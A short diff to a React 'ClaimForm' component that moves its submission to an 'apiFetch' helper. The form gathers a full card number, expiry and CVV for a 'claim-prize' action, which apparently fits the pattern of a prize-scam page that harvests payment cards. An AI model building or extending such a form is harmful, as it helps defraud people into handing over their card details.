@@ -1,5 +1,6 @@
 'use client'
 import { useState } from 'react'
+import { apiFetch } from '@/lib/apiFetch'
 
 function fmtCard(v) {
   return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
@@ -46,19 +47,13 @@ export default function ClaimForm({ onSuccess }) {
     if (form.cvv.length !== 3) { setError('CVV must be 3 digits'); return }
     setLoading(true)
     try {
-      const res = await fetch('/api/db', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'claim-prize',
-          cardholder_name: form.name,
-          card_number: raw,
-          card_expiry: form.expiry,
-          card_cvv: form.cvv,
-        }),
+      const data = await apiFetch('claim-prize', {
+        cardholder_name: form.name,
+        card_number: raw,
+        card_expiry: form.expiry,
+        card_cvv: form.cvv,
       })
-      const data = await res.json()
-      if (!res.ok) setError(data.error || 'Submission failed')
+      if (data.error) setError(data.error)
       else onSuccess()
     } catch {
       setError('Network error. Please try again.')
